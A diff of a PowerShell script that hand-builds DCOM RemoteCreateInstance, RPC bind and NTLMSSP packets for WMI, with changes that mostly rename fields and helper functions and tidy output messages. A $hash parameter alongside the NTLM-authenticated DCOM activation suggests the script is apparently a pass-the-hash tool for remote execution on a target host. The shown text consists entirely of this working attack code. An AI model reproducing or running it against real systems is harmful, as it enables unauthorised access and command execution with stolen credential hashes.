-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoContextID",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoPrivateHeader",[Byte[]](0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoNULLPtr",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrReferentID",[Byte[]](0x00,0x00,0x02,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestClientImpersonationLevel",[Byte[]](0x02,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestNumProtocolSequences",[Byte[]](0x01,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestUnknown",[Byte[]](0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestProtocolSeqsArrayPtrReferentID",[Byte[]](0x04,0x00,0x02,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestProtocolSeqsArrayPtrMaxCount",[Byte[]](0x01,0x00,0x00,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestProtocolSeqsArrayPtrProtocolSeq",[Byte[]](0x07,0x00))
-    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoUnusedBuffer",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("DCOMVersionMajor",[Byte[]](0x05,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("DCOMVersionMinor",[Byte[]](0x07,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("DCOMFlags",[Byte[]](0x01,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("DCOMReserved",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("DCOMCausalityID",$packet_causality_ID)
+    $packet_DCOMRemoteCreateInstance.Add("Unknown",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("Unknown2",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("Unknown3",[Byte[]](0x00,0x00,0x02,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("Unknown4",$packet_cntdata)
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCntData",$packet_cntdata)
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesOBJREFSignature",[Byte[]](0x4d,0x45,0x4f,0x57))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesOBJREFFlags",[Byte[]](0x04,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesOBJREFIID",[Byte[]](0xa2,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFCLSID",[Byte[]](0x38,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFCBExtension",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFSize",$packet_size)
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesTotalSize",$packet_total_size)
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesReserved",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderPrivateHeader",[Byte[]](0xb0,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderTotalSize",$packet_total_size)
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderCustomHeaderSize",[Byte[]](0xc0,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderReserved",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesDestinationContext",[Byte[]](0x02,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesNumActivationPropertyStructs",[Byte[]](0x06,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsInfoClsid",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrReferentID",[Byte[]](0x00,0x00,0x02,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrReferentID",[Byte[]](0x04,0x00,0x02,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesNULLPointer",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrMaxCount",[Byte[]](0x06,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid",[Byte[]](0xb9,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid2",[Byte[]](0xab,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid3",[Byte[]](0xa5,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid4",[Byte[]](0xa6,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid5",[Byte[]](0xa4,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid6",[Byte[]](0xaa,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrMaxCount",[Byte[]](0x06,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize",[Byte[]](0x68,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize2",[Byte[]](0x58,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize3",[Byte[]](0x90,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize4",$packet_property_data_size)
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize5",[Byte[]](0x20,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize6",[Byte[]](0x30,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesPrivateHeader",[Byte[]](0x58,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesSessionID",[Byte[]](0xff,0xff,0xff,0xff))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesRemoteThisSessionID",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesClientImpersonating",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesPartitionIDPresent",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesDefaultAuthnLevel",[Byte[]](0x02,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesPartitionGuid",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesProcessRequestFlags",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesOriginalClassContext",[Byte[]](0x14,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesFlags",[Byte[]](0x02,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesReserved",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesUnusedBuffer",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoPrivateHeader",[Byte[]](0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoInstantiatedObjectClsId",[Byte[]](0x5e,0xf0,0xc3,0x8b,0x6b,0xd8,0xd0,0x11,0xa0,0x75,0x00,0xc0,0x4f,0xb6,0x88,0x20))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoClassContext",[Byte[]](0x14,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoActivationFlags",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoFlagsSurrogate",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoInterfaceIdCount",[Byte[]](0x01,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoInstantiationFlag",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIdsPtr",[Byte[]](0x00,0x00,0x02,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationEntirePropertySize",[Byte[]](0x58,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationVersionMajor",[Byte[]](0x05,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationVersionMinor",[Byte[]](0x07,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIdsPtrMaxCount",[Byte[]](0x01,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIds",[Byte[]](0x18,0xad,0x09,0xf3,0x6a,0xd8,0xd0,0x11,0xa0,0x75,0x00,0xc0,0x4f,0xb6,0x88,0x20))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIdsUnusedBuffer",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoPrivateHeader",[Byte[]](0x80,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientOk",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoReserved",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoReserved2",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoReserved3",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrReferentID",[Byte[]](0x00,0x00,0x02,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoNULLPtr",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextUnknown",[Byte[]](0x60,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextCntData",[Byte[]](0x60,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFSignature",[Byte[]](0x4d,0x45,0x4f,0x57))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFFlags",[Byte[]](0x04,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFIID",[Byte[]](0xc0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFCUSTOMOBJREFCLSID",[Byte[]](0x3b,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFCUSTOMOBJREFCBExtension",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFCUSTOMOBJREFSize",[Byte[]](0x30,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoUnusedBuffer",[Byte[]](0x01,0x00,0x01,0x00,0x63,0x2c,0x80,0x2a,0xa5,0xd2,0xaf,0xdd,0x4d,0xc4,0xbb,0x37,0x4d,0x37,0x76,0xd7,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoPrivateHeader",$packet_private_header)
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoAuthenticationFlags",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoPtrReferentID",[Byte[]](0x00,0x00,0x02,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoNULLPtr",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoReserved",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameReferentID",[Byte[]](0x04,0x00,0x02,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNULLPtr",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoReserved2",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameMaxCount",$packet_target_length)
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameOffset",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameActualCount",$packet_target_length)
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameString",$packet_target_unicode)
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoPrivateHeader",[Byte[]](0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoNULLPtr",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoProcessID",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoApartmentID",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoContextID",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoPrivateHeader",[Byte[]](0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoNULLPtr",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrReferentID",[Byte[]](0x00,0x00,0x02,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestClientImpersonationLevel",[Byte[]](0x02,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestNumProtocolSequences",[Byte[]](0x01,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestUnknown",[Byte[]](0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestProtocolSeqsArrayPtrReferentID",[Byte[]](0x04,0x00,0x02,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestProtocolSeqsArrayPtrMaxCount",[Byte[]](0x01,0x00,0x00,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestProtocolSeqsArrayPtrProtocolSeq",[Byte[]](0x07,0x00))
+    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoUnusedBuffer",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00))
 
     return $packet_DCOMRemoteCreateInstance
 }
 
-function DataLength2
+function Get-UInt16DataLength
 {
-    param ([Int]$length_start,[Byte[]]$string_extract_data)
+    param ([Int]$Start,[Byte[]]$Data)
 
-    $string_length = [System.BitConverter]::ToUInt16($string_extract_data[$length_start..($length_start + 1)],0)
+    $data_length = [System.BitConverter]::ToUInt16($Data[$Start..($Start + 1)],0)
 
-    return $string_length
+    return $data_length
 }
 
 if($hash -like "*:*")
@@ -533,7 +532,7 @@ try
 }
 catch
 {
-    Write-Output "$Target did not respond"
+    Write-Output "[-] $Target did not respond"
 }
 
 if($WMI_client_init.Connected)
@@ -541,15 +540,15 @@ if($WMI_client_init.Connected)
     $WMI_client_stream_init = $WMI_client_init.GetStream()
     $WMI_client_receive = New-Object System.Byte[] 2048
     $RPC_UUID = 0xc4,0xfe,0xfc,0x99,0x60,0x52,0x1b,0x10,0xbb,0xcb,0x00,0xaa,0x00,0x21,0x34,0x7a
-    $packet_RPC = Get-PacketRPCBind 2 0xd0,0x16 0x02 0x00,0x00 $RPC_UUID 0x00,0x00
-    $packet_RPC["RPCBind_FragLength"] = 0x74,0x00    
+    $packet_RPC = New-PacketRPCBind 2 0xd0,0x16 0x02 0x00,0x00 $RPC_UUID 0x00,0x00
+    $packet_RPC["FragLength"] = 0x74,0x00    
     $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
     $WMI_client_send = $RPC
     $WMI_client_stream_init.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
     $WMI_client_stream_init.Flush()    
     $WMI_client_stream_init.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
     $assoc_group = $WMI_client_receive[20..23]
-    $packet_RPC = Get-PacketRPCRequest 0x03 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x05,0x00
+    $packet_RPC = New-PacketRPCRequest 0x03 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x05,0x00
     $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
     $WMI_client_send = $RPC
     $WMI_client_stream_init.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
@@ -580,17 +579,17 @@ if($WMI_client_init.Connected)
     }
     catch
     {
-        Write-Output "$target_long did not respond"
+        Write-Output "[-] $target_long did not respond"
     }
 
     if($WMI_client.Connected)
     {
         $WMI_client_stream = $WMI_client.GetStream()
         $RPC_UUID = 0xa0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46
-        $packet_RPC = Get-PacketRPCBind 3 0xd0,0x16 0x01 0x01,0x00 $RPC_UUID 0x00,0x00
-        $packet_RPC["RPCBind_FragLength"] = 0x78,0x00
-        $packet_RPC["RPCBind_AuthLength"] = 0x28,0x00
-        $packet_RPC["RPCBind_NegotiateFlags"] = 0x07,0x82,0x08,0xa2
+        $packet_RPC = New-PacketRPCBind 3 0xd0,0x16 0x01 0x01,0x00 $RPC_UUID 0x00,0x00
+        $packet_RPC["FragLength"] = 0x78,0x00
+        $packet_RPC["AuthLength"] = 0x28,0x00
+        $packet_RPC["NegotiateFlags"] = 0x07,0x82,0x08,0xa2
         $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
         $WMI_client_send = $RPC
         $WMI_client_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
@@ -601,8 +600,8 @@ if($WMI_client_init.Connected)
         $WMI_NTLMSSP = $WMI_NTLMSSP -replace "-",""
